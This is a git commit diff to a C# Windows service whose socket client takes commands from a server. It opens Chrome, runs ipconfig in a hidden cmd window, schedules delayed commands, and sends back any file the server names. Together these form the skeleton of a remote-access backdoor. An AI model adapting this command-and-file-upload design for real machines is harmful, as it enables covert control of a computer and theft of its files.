366638e90d4310fe5250bef2207081e9485131be
yonatan ben avi <yonatanbenavi@gmail.com>
2021-03-11 11:49:47 +0200

    update 206

--- MyNewService/Client.cs
+++ MyNewService/Client.cs
@@ -17,104 +17,121 @@ namespace MyNewService
             byte[] bytes = new byte[1024];
 
             // Connect to a remote device.  
-            try
+            // try
+            //{
+
+            // Establish the remote endpoint for the socket.  
+            // This example uses port 11000 on the local computer.  
+            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
+            IPAddress ipAddress = ipHostInfo.AddressList[0];
+            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 11000);
+
+            // Create a TCP/IP  socket.  
+            Socket sender = new Socket(ipAddress.AddressFamily,
+                SocketType.Stream, ProtocolType.Tcp);
+
+            // Connect the socket to the remote endpoint. Catch any errors.  
+            //try
+            //{
+            sender.Connect(remoteEP);
+
+            Console.WriteLine(String.Format("Socket connected to {0}",
+                sender.RemoteEndPoint.ToString()));
+
+
+            while (true)
             {
-                // Establish the remote endpoint for the socket.  
-                // This example uses port 11000 on the local computer.  
-                IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
-                IPAddress ipAddress = ipHostInfo.AddressList[0];
-                IPEndPoint remoteEP = new IPEndPoint(ipAddress, 11000);
 
-                // Create a TCP/IP  socket.  
-                Socket sender = new Socket(ipAddress.AddressFamily,
-                    SocketType.Stream, ProtocolType.Tcp);
+                String msg = ReciveMessageFromServer(sender);
 
-                // Connect the socket to the remote endpoint. Catch any errors.  
-                try
+                String returnMsg = HandleCommand(msg, sender);
+
+                SendMessageToServer(sender, returnMsg);
+
+
+                if (msg.Equals("done") || msg.Equals("quit"))
                 {
-                    sender.Connect(remoteEP);
-
-                    MyNewService.WriteToLog(String.Format("Socket connected to {0}",
-                        sender.RemoteEndPoint.ToString()));
-
-
-                    while (true)
-                    {
-                        /*
-                        // Encode the data string into a byte array.  
-                        byte[] msg = Encoding.ASCII.GetBytes("This is a test<EOF>");
-
-                        // Send the data through the socket.  
-                        int bytesSent = sender.Send(msg);
-                        */
-
-                        // Receive the response from the remote device.  
-                        int bytesRec = sender.Receive(bytes);
-
-                        String msg = Encoding.ASCII.GetString(bytes, 0, bytesRec);
-
-                        //MyNewService.WriteToLog(String.Format("Echoed test = {0}",msg));
-                        HandleCommand(msg, sender);
-
-
-                        if (msg.Equals("done")){
-                            break;
-                        }
-
-                    }
-                    // Release the socket.  
-                    MyNewService.WriteToLog("closing connection");
-                    sender.Shutdown(SocketShutdown.Both);
-                    sender.Close();
-
-                }
-                catch (ArgumentNullException ane)
-                {
-                    MyNewService.WriteToLog("ArgumentNullException : {0}" + ane.ToString());
-                }
-                catch (SocketException se)
-                {
-                    MyNewService.WriteToLog("SocketException : {0}" + se.ToString());
-                }
-                catch (Exception e)
-                {
-                    MyNewService.WriteToLog("Unexpected exception : {0}" + e.ToString());
+                    break;
                 }
 
+            }
+
+            // Release the socket.  
+            MyNewService.WriteToLog("closing connection");
+            sender.Shutdown(SocketShutdown.Both);
+            sender.Close();
+
+
+            /*
+            catch (ArgumentNullException ane)
+            {
+                Console.WriteLine("ArgumentNullException : {0}" + ane.ToString());
+            }
+            catch (SocketException se)
+            {
+                Console.WriteLine("SocketException : {0}" + se.ToString());
             }
             catch (Exception e)
             {
-                MyNewService.WriteToLog(e.ToString());
+                Console.WriteLine("Unexpected exception : {0}" + e.ToString());
             }
+
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(e.ToString());
+        }
+            */
         }
 
 
-        public static void Wait(TimeSpan t)
+
+
+        public static void Wait(TimeSpan t, String command, Socket sender)
         {
             Thread.Sleep(t);
             MyNewService.WriteToLog("i finished waiting: " + t);
-
+            HandleCommand(command, sender);
         }
 
-        public static void HandleCommand(String command, Socket sender)
+
+
+
+
+
+        public static String HandleCommand(String command, Socket sender)
         {
-            MyNewService.WriteToLog(command.Substring(0, command.IndexOf(" ")));
-            switch (command.Substring(0, command.IndexOf(" ")))
+            String[] commandArray = command.Split(' ');
+            String command1 = commandArray[0];
+            String msgToBeReturned = "";
+            MyNewService.WriteToLog("command 1: " + command1);
+            switch (command1)
             {
                 case "time":
+                    //should accept like this:
+                    // time 2021,02,15,08,0,0 command
                     DateTime timeNow = DateTime.Now;
-                    DateTime inputTime = new DateTime(2020, 12, 27, 9, 12, 0);
+                    int[] timeArr = Array.ConvertAll(commandArray[1].Split(','), int.Parse);
+                    DateTime inputTime = new DateTime(timeArr[0], timeArr[1], timeArr[2], timeArr[3], timeArr[4], timeArr[5]);
                     TimeSpan value1 = inputTime.Subtract(timeNow);
-                    MyNewService.WriteToLog("waiting: " + value1);
-                    Thread thread = new Thread(() => Wait(value1));
+                    Console.WriteLine("waiting: " + value1);
+                    Thread thread = new Thread(() => Wait(value1, commandArray[2], sender));
                     thread.Start();
+                    msgToBeReturned = "thread started successfully";
                     break;
                 case "done":
-                    MyNewService.WriteToLog("i am done");
+                case "quit":
+                    MyNewService.WriteToLog("the server has requested to disconnect");
+                    msgToBeReturned = "by by server";
                     break;
                 case "chrome":
                     MyNewService.WriteToLog("opening chrome");
-                    System.Diagnostics.Process.Start(@"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe");
+                    var test = System.Diagnostics.Process.Start(@"C:\Program Files\Google\Chrome\Application\chrome.exe");
+                    if (test.GetType() == null)
+                    {
+                        MyNewService.WriteToLog("null");
+                    }
+                    msgToBeReturned = "opening chrome";
                     break;
                 case "ipconfig":
                     MyNewService.WriteToLog("runing ipconfig");
@@ -122,29 +139,63 @@ namespace MyNewService
                     System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                     startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                     startInfo.FileName = "cmd.exe";
-                    startInfo.Arguments = @"/C ipconfig > C:\Users\david\Desktop\test\ipconfig.txt";
+                    startInfo.Arguments = @"/C ipconfig > C:\Users\shay\Desktop\client\ipconfig.txt";
                     process.StartInfo = startInfo;
                     process.Start();
+                    msgToBeReturned = "done ipconfig";
                     break;
-                case "file":
+                case "send_file":
                     // There is a text file test.txt located in the root directory.
-                    string fileName = "C:\\Users\\david\\Desktop\\test\\test1.txt";
+                    string fileName = @commandArray[1];
                     // Send file fileName to remote device
-                    MyNewService.WriteToLog("Sending {0} to the host." + fileName);
-                    // Send the data through the socket.  
-                    string readText = File.ReadAllText(fileName) + "<EOF>";
-                    byte[] msg = Encoding.ASCII.GetBytes(readText);
-                    sender.Send(msg);
+                    Console.WriteLine("Sending {0} to the host." + fileName);
+                    byte[] file = File.ReadAllBytes(fileName);
+                    String fileLen = file.Length.ToString().PadLeft(10, '0'); ;
+                    byte[] fileLenBytes = Encoding.ASCII.GetBytes(fileLen);
+                    sender.Send(fileLenBytes);
+                    sender.Send(file);
+                    msgToBeReturned = "file has been sent succesfully";
+
+                    break;
+                case "info":
+                    msgToBeReturned = "I am yonatans client";
                     break;
                 default:
                     MyNewService.WriteToLog("command not recognized");
+                    msgToBeReturned = "command not recognized";
                     break;
-
-
             }
+            return msgToBeReturned;
         }
 
-       
+        public static String ReciveMessageFromServer(Socket sender)
+        {
+            byte[] size = new byte[10];
+
+            // Receive the response from the remote device.  
+            int sizeLen = sender.Receive(size);
+
+            int rcvSize = Int32.Parse(Encoding.ASCII.GetString(size, 0, sizeLen));
+
+
+            byte[] bytes = new byte[rcvSize];
+            int bytesRec = sender.Receive(bytes);
+
+            String msg = Encoding.ASCII.GetString(bytes, 0, bytesRec);
+            return msg;
+        }
+
+        public static void SendMessageToServer(Socket sender, String response)
+        {
+            String msgLen = response.Length.ToString().PadLeft(10, '0');
+
+            // Echo the data back to the client.  
+            byte[] msg = Encoding.ASCII.GetBytes(msgLen + response);
+
+            sender.Send(msg);
+        }
+
+
 
         public static int Main(String[] args)
         {
